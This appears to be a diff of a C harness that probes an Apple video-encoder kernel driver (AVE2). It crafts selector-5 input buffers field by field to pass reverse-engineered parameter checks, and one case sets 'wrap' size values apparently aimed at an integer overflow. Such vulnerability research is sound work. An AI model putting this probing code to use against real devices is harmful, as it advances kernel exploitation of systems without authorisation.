@@ -852,48 +852,6 @@ int main(void) {
                 /* 对照：不搬移，结构体仍在 +0，只把 +0x04 写成 5 */
                 memcpy(d5, sub, 0x1a0a0);
                 *(uint32_t *)(d5 + 0x04) = 5;
-    } else if (test != NULL && strcmp(test, "sid5") == 0) {
-        /* v46: AVE_UCCmd_CheckParam_Start @0x1b98084 / wrapper @0x1b98f14 读的是 Start 自己的字段:
-              +0x04 eUCCmd 必须 == 5            (Check_Start 0x1a25d94)
-              +0x10 iDataCnt   s64 >= 0        ("pIn->iDataCnt >= 0",  断言行 0x1c)
-              +0x18 sTimeOut.iTimeOut   s64>=0 ("...iStartTime >= 0",  断言行 0x22)
-              +0x20 sTimeOut.iStartTime s64>=0
-              +0x28 iUCInfoSID u32 != 0        (cbz -> "wrong ...")
-              +0xa0a8 iUCInfoIdx s32 sign      ("pIn->iUCInfoIdx >= 0", 行 0xe2)
-           hdr5 的 -1001 = 版本串被 memcpy 盖到 +0x10 => 这版按字段填。 */
-        const char *patch = getenv("AVE2_MS_PATCH");
-        printf("=== sid5: field-correct Start input matrix ===\n");
-        for (int li = 0; li < 4; li++) {
-          size_t lay[4] = {0x10, 0x30, 0x40, 0x200};
-          for (int si = 0; si < 3; si++) {
-            uint32_t SIDv[3] = {1u, 0x132eu, 0x4cfa4u};
-            char tag[48]; snprintf(tag,sizeof(tag),"L%zx SID%x", lay[li], SIDv[si]);
-            if (create_session(1, &c) != 0) { printf("[-] create\n"); goto s5done; }
-            { uint8_t din[0x40]; memset(din,0,sizeof(din)); memcpy(din,"904.76.7",8);
-              iodyn_async_ref_t aref; memset(aref,0,sizeof(aref)); aref[0]=1;
-              memset(out,0xAA,sizeof(out)); size_t o2=0x20;
-              p_IOConnectCallAsyncStructMethod(c,3,wake,aref,8,din,0x38,out,&o2); }
-            drain_wake(wake, 50);
-            fill_cfg(0, 1920, 1080, 2, 1, 0, 0);
-            sel4_p(tag, c, 0, 0x1a0a0, patch);
-            uint8_t d5[0x1a0b0]; memset(d5, 0, sizeof(d5));
-            *(uint32_t *)(d5 + 0x04) = 5;                  /* eUCCmd = AVE_UCCmd_Start */
-            *(int64_t  *)(d5 + 0x10) = 1;                  /* iDataCnt   >= 0 */
-            *(int64_t  *)(d5 + 0x18) = 0;                  /* iTimeOut   >= 0 */
-            *(int64_t  *)(d5 + 0x20) = 0;                  /* iStartTime >= 0 */
-            *(uint32_t *)(d5 + 0x28) = SIDv[si];           /* iUCInfoSID != 0 */
-            *(int32_t  *)(d5 + 0xa0a8) = 0;                /* iUCInfoIdx >= 0 */
-            memcpy(d5 + lay[li], stat_in, 0x1a0a0 - lay[li]);
-            uint8_t o5[0x150]; size_t o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
-            kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, d5, sizeof(d5), o5, &o5z);
-            printf("    [%s] sel5 -> 0x%08x %s osz=%zu out0:", tag, k5, krname(k5), o5z);
-            for (size_t q = 0; q < 16 && q < o5z; q++) printf("%02x", o5[q]);
-            printf("\n");
-            destroy_close(c);
-          }
-        }
-s5done:
-        printf("=== sid5 done ===\n");
             } else {
                 memcpy(d5 + 0x10, sub, 0x1a0a0);
                 static const uint32_t hdr[8][4] = {
@@ -919,6 +877,62 @@ s5done:
             destroy_close(c);
         }
         printf("=== hdr5 done ===\n");
+    } else if (test != NULL && strcmp(test, "sid5") == 0) {
+        /* v47: AVE_UCCmd_CheckParam_Start (@0x1b99034 / wrapper @0x1b99034 family) reads Start own fields:
+              +0x04 eUCCmd == 5 | +0x10 iDataCnt s64>=0 | +0x18 iTimeOut s64>=0 | +0x20 iStartTime s64>=0
+              +0x28 iUCInfoSID u32!=0 | +0xa0a8 iUCInfoIdx s32>=0
+           => common header is 0x30, not 0x10 (0x1a0b0 - 0x30 = 0x1a080 payload).
+           Failure tail 0x1b99248 always does mov w22,#-0x3e9 (-1001), so the return code cannot tell
+           which field failed => isolate one field per case. v46 ordering bug fixed here: copy the
+           payload FIRST, then write header fields (v46 wrote the header first and the memcpy of the
+           Prepare body overwrote +0x10..+0x28 with the version string). */
+        const char *patch = getenv("AVE2_MS_PATCH");
+        printf("=== sid5 v47: Start header 0x30, per-field isolation ===\n");
+        for (int ci = 0; ci < 10; ci++) {
+            size_t lay = 0x30;
+            int copyPayload = 1; uint32_t SIDv = 1u; int64_t dc = 1, to = 0, st = 0; int lrb = 0;
+            if (ci == 0) copyPayload = 0;                     /* header only */
+            if (ci == 1) SIDv = 0u;                           /* SID=0 control */
+            if (ci == 2) dc = 0;                              /* iDataCnt = 0 */
+            if (ci == 3) to = 1;                              /* iTimeOut = 1 */
+            if (ci == 4) st = 1;                              /* iStartTime = 1 */
+            if (ci == 5) lay = 0x10;                          /* header-0x10 hypothesis */
+            if (ci == 6) lay = 0x40;
+            if (ci == 7) { copyPayload = 0; SIDv = 0x132eu; }  /* header only + real SID */
+            if (ci == 8) lrb = 1;                             /* payload carries LRB wrap recipe */
+            char tag[40]; snprintf(tag, sizeof(tag), "C%d lay%zx cp%d SID%x", ci, lay, copyPayload, SIDv);
+            if (create_session(1, &c) != 0) { printf("[-] create\n"); goto s5done; }
+            { uint8_t din[0x40]; memset(din,0,sizeof(din)); memcpy(din,"904.76.7",8);
+              iodyn_async_ref_t aref; memset(aref,0,sizeof(aref)); aref[0]=1;
+              memset(out,0xAA,sizeof(out)); size_t o2=0x20;
+              p_IOConnectCallAsyncStructMethod(c,3,wake,aref,8,din,0x38,out,&o2); }
+            drain_wake(wake, 50);
+            fill_cfg(0, 1920, 1080, 2, 1, 0, 0);
+            sel4_p(tag, c, 0, 0x1a0a0, patch);
+            uint8_t d5[0x1a0b0]; memset(d5, 0, sizeof(d5));
+            if (copyPayload) memcpy(d5 + lay, stat_in, 0x1a0a0 - lay);
+            *(uint32_t *)(d5 + 0x04) = 5;
+            *(int64_t  *)(d5 + 0x10) = dc;
+            *(int64_t  *)(d5 + 0x18) = to;
+            *(int64_t  *)(d5 + 0x20) = st;
+            *(uint32_t *)(d5 + 0x28) = SIDv;
+            *(int32_t  *)(d5 + 0xa0a8) = 0;
+            if (lrb) {
+                *(uint32_t *)(d5 + 0x264) = 1;
+                *(uint32_t *)(d5 + 0x26c) = 0x10000;
+                *(uint32_t *)(d5 + 0x270) = 0x10000;
+                *(uint32_t *)(d5 + 0x274) = 4;
+                *(uint32_t *)(d5 + 0x278) = 4;
+            }
+            uint8_t o5[0x150]; size_t o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
+            kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, d5, sizeof(d5), o5, &o5z);
+            printf("    [%s%s] sel5 -> 0x%08x %s osz=%zu out0:", tag, lrb?" LRB":"", k5, krname(k5), o5z);
+            for (size_t q = 0; q < 16 && q < o5z; q++) printf("%02x", o5[q]);
+            printf("\n");
+            destroy_close(c);
+        }
+s5done:
+        printf("=== sid5 done ===\n");
     } else {
         /* default battery: enctype sweep + no-create ladder */
         printf("\n=== S1 create m1: enctype sweep (static) ===\n");
